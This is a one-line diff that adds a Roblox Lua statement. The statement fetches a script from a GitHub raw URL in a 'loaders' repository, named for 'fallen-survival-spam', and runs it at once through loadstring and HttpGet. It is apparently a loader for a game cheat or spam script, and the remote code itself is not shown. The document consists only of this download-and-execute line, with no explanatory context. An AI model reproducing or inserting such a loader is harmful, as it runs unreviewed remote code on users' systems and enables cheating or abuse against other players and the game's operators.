@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/upd-fallen-survival-spam2-w15b4khpoeqkld.lua"))()
